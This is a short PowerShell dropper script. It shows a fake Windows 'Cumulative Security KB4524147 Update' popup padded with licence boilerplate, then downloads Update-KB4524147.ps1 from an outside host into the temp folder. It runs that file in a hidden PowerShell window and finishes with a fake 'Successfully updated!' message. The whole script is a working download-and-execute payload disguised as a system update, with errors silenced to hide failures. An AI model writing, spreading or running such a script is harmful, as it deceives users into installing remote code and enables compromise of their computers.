$ErrorActionPreference = "SilentlyContinue"
powershell (New-Object -ComObject Wscript.Shell).Popup("                                                Feature update                                                `n`nTHIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`n`n                            Install Cumulative Security KB4524147 Update?",5,"                            Cumulative Security KB4524147 Update",3+0)|Out-Null
iwr -Uri "http://CharlieBrown/Update-KB4524147.ps1" -OutFile "$Env:TMP\Update-KB4524147.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "powershell -File $Env:TMP\Update-KB4524147.ps1"|Out-Null
powershell (New-Object -ComObject Wscript.Shell).Popup("Successfully updated! - Version: 45.19041.964.0",3,"                      Cumulative Security KB4524147 Update",0+64)|Out-Null
exit
